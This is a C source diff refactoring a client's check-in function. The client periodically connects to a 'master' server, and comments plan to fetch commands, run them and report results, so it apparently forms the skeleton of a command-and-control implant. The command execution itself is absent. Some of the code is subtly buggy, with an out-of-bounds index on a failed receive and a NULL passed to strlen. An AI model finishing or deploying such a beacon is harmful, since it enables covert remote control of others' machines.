@@ -28,7 +28,8 @@ int main(int argc, char **argv){
         // if command
             // run command
             // save results to be sent back on next beacon
-        master_checkin(master, "what the flying fuck?");
+        char *resp = master_checkin(master, NULL);
+        free(resp);
     }
     return 0;
 }
@@ -49,42 +50,36 @@ int master_init(struct sockaddr_in *master) {
     return 0;
 }
 
-int master_checkin(struct sockaddr_in master, char *data){
-    char server_reply[2000];
+char *master_checkin(struct sockaddr_in master, char *data){
+    char *server_reply = (char *)malloc(2000);
     int recv_size;
     #if defined __apple__ || defined(__linux__) || defined(__unix__)
         // do standard sockets
+        bzero(server_reply, 2000);
         int s;
         if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
             #ifdef CLIENT_DEBUG
                 printf("[master_checkin] Socket creation failed.");
             #endif
-            return -1;
+                return server_reply;
         }
         // Establish connection
         if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
             #ifdef CLIENT_DEBUG
                 printf("[master_checkin] Connect to master failed.");
-                perror("wut");
             #endif
-            return -1;
+            return server_reply;
         }
         // Send data
-        if(send(s , data , strlen(data) , 0) < 0)
+        if(data && send(s , data , strlen(data) , 0) < 0)
         {
-            return -1; //something failed :(
+            return server_reply; //something failed :(
         }
         //Receive a reply from the server
         if((recv_size = recv(s , server_reply , 2000 , 0)) < 0)
         {
             puts("recv failed");
         }
-
-        puts("Reply received\n");
-
-        //Add a NULL terminating character to make it a proper string before printing
-        server_reply[recv_size] = '\0';
-        puts(server_reply);
     #elif __windows__
         WSADATA wsa;
         SOCKET s;
@@ -97,7 +92,7 @@ int master_checkin(struct sockaddr_in master, char *data){
             #ifdef CLIENT_DEBUG
                 printf("Failed. Error: %d",WSAGetLastError());
             #endif
-            return -1; //windows being windows
+            return server_reply;
         }
 
         //Create a socket
@@ -106,38 +101,29 @@ int master_checkin(struct sockaddr_in master, char *data){
             #ifdef CLIENT_DEBUG
                 printf("Could not create socket : %d" , WSAGetLastError());
             #endif
-            return -1; //failed to make socket... die
+            return server_reply;
         }
-
-        // Connection settings
-        master.sin_addr.s_addr = inet_addr( MASTER_IP );
-        master.sin_family = AF_INET;
-        master.sin_port = htons( MASTER_PORT );
 
         // Connect to master
         if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0)
         {
-            return -1; //couldn't connect... shit.
+            return server_reply;
         }
 
         // Send data
         if( send(s , data , strlen(data) , 0) == SOCKET_ERROR)
         {
-            return -1; //something failed :(
+            return server_reply;
         }
         //Receive a reply from the server
         if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
         {
             puts("recv failed");
         }
-
-        puts("Reply received\n");
-
         //Add a NULL terminating character to make it a proper string before printing
-        server_reply[recv_size] = '\0';
-        puts(server_reply);
     #endif
-    return 0;
+    server_reply[recv_size] = '\0';
+    return server_reply;
 }
 
 char *get_os() {
